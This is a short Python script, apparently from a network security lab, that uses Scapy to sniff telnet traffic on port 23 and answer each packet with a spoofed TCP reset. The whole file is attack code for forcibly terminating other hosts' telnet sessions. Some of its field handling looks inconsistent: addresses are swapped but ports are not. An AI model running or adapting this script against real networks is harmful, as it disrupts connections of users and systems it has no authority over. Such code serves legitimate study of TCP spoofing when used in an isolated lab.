#!/usr/bin/python
from scapy.all import *

def reset_pkt(pkt):
	src = pkt[IP].dst
	dst = pkt[IP].src
	newIP = IP()
	newIP.src = src
	newIP.dst = dst
	newTCP = TCP()
	newTCP.sport = pkt[TCP].sport
	newTCP.dport = 23
	newTCP.flags = 4
	newTCP.seq = pkt[TCP].seq
	newTCP.ack = pkt[TCP].ack
	newPkt = newIP/newTCP
	ls(newPkt)
	send(newPkt,verbose=0)


pkt = sniff(filter='dst port 23', prn=reset_pkt)